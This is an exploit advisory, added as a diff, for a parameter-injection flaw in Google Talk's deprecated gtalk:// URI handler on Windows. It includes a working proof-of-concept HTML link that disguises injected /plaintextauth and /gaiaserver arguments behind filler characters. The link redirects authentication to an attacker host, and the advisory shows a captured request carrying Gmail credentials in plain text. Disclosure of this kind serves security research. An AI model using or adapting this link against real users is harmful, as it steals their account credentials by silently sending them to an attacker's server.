@@ -1,0 +1,115 @@
+Google Talk gtalk:// Deprecated Uri Handler /gaiaserver Parameter Injection Vulnerability 
+
+tested against: Internet Explorer 8
+                Microsoft Windows (all versions)
+
+
+download url of 1.0.0.104:
+http://www.google.com/talk/install.html
+
+download urls of 1.0.0.105:
+http://www.google.com/talk/intl/it/
+http://www.google.com/talk/intl/fr/
+http://www.google.com/talk/intl/de/
+...
+
+
+rgod: "Why two versions are downloadable on the internet at the same time?"
+
+- Who is vulnerable?
+
+  - More probably international users, non Eglish speaking one
+
+- When this attack does not work: 
+   
+    -when you install Google Talk 1.0.0.104
+    -then you uninstall diligently 1.0.0.104
+    -then you install 1.0.0.105
+
+-When this attack works:
+   
+    -when you install Google Talk 1.0.0.104
+    -then you install 1.0.0.105
+
+     or
+
+    -when you installed multiple times, never using the uninstall functionality
+     which is the reality of it
+
+-Why?
+
+ Because 1.0.0.105 has not the gtalk:// uri handler functionality but the command line behaviour changed
+ Indeeds, 1.0.0.104 or 1.0.0.105 are not vulnerable alone but 1.0.0.105, when installed, does not remove
+ the old uri handler.
+
+My girlfriend's comment: "But people do not unistall the older one before installing the new one !!!! This is huge !!!!!!!!!!"
+rgod                   : "You are right, two steps are better than three"
+
+
+
+Vulnerability: Injection of custom parameters 
+
+Google Talk 1.0.0.104 registers on windows a deprecated uri handler, registry dump:
+
+[HKEY_CLASSES_ROOT\gtalk]
+"URL Protocol"=""
+
+[HKEY_CLASSES_ROOT\gtalk\shell]
+
+[HKEY_CLASSES_ROOT\gtalk\shell\open]
+
+[HKEY_CLASSES_ROOT\gtalk\shell\open\command]
+@="\"C:\\Program Files\\Google\\Google Talk\\googletalk.exe\" \"/%1\""
+
+
+By crafting a link a remote user can inject custom command line parameters.
+
+
+injectable parameters:
+
+/plaintextauth
+
+Uses plain authentication mechanism
+
+/gaiaserver [host:port]
+
+Uses a different GAIA server to authenticate the client
+
+/nomutex
+
+Allows multiple instances of Google Talk
+
+
+proof of concept:
+
+<a href='gtalk://mymail@gmail.com ???????????????????????????????????????????????????????"%20/plaintextauth%20/gaiaserver%20192.168.2.101:80%20/nomutex%20/'>chat with me</a>
+
+
+(???????????? ... are estethics, when prompted the victim does not see the other stuff)
+
+Gmail credentials are sent to 192.168.201:80 instead of google default gaia server, packet dump when sniffing the network 
+or listening on that port:
+
+POST /accounts/ClientAuth HTTP/1.1
+Connection: Keep-Alive
+Content-Length: [length]
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.2.101
+User-Agent: Google Talk
+
+Email=your%40gmail.com&Passwd=%70%61%73%73&PersistentCookie=false&source=googletalk
+
+
+password is plain text, urldecoded:
+
+user: yout@gmail.com
+pass: pass
+
+Now you are done, you spiffed your password to the unknown (evil) world.
+
+If you already logged in on gmail server olders credentials are sent without user interaction,
+otherwise if the user tries to login manually credentials are sent aswell to the attacker server
+
+
+
+//rgod - 7.39 21/03/2012
